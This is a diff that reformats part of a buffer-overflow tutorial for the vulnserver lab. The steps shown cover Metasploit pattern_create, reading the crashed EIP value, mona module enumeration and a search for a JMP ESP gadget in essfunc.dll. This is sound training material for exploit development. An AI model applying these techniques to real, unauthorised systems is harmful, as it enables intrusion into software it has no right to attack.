@@ -82,13 +82,10 @@ We need to identify what information is stored in each register at the crash mom
 Identify the exact size of the buffer where the program crashes by creating an special string with metasploit framework pattern\_create (locate pattern\_create). In my case I had to run it in this way:
 
            /opt/metasploit\-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern\_create.rb -l 5000
-
-In other Kali: 
+           In other Kali: 
            msf-pattern\_create -l \[LENGHT\]
-           
-#This can also be generated using mona.py in Immunity Debugger but I will not show here the details.
-
-#Phase 3 of the python script help us to identify this task.
+           \#This can also be generated using mona.py in Immunity Debugger but I will not show here the details.
+           #Phase 3 of the python script help us to identify this task.
 
 Restart the vulnserver in windows from the debugger (ctrl-F2) and run the python script Phase 2 using the pattern we got. Once the server crash, check the value in the registers (right side in immunity), specially the EIP value. In this case it is **386F4337**
 
@@ -126,20 +123,17 @@ More details about mona: [https://www.corelan-training.com/](https://www.corelan
 
 To run mona, in Immunity Debugger run the command in the textbox in the downside of the debugger. Just write:
 
-!mona modules #In this case essfunc.dll is found
-
-\# Identify which modules have less protections active from the process running.
-
-\# To know the op codefor JUMP ESP we can use msf-nasm\_shell. Run it and put JMP ESP to identify the op code
-
+           !mona modules #In this case essfunc.dll is found
+           \# Identify which modules have less protections active from the process running.
+           \# To know the op codefor JUMP ESP we can use msf-nasm\_shell. Run it and put JMP ESP to identify the op code
+           
            msf-nasm\_shell
            \>JMP ESP
            \#In other Kali is: /opt/metasploit\-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/nasm\_shell.rb
            \#We got "FFE4"
            \# Now we need to look for the instruction JMP ESP ("\\xff\\xe4") in the memory for any of these unprotected modules
            !mona find -s "\\xff\\xe4" -m "essfunc.dll" => -s is the byte string to search for, -m specifies the module to search in
-
-#9 occurrences were found.
+           \#9 occurrences were found.
 
 ![](BoF_files/image004.jpg)
 
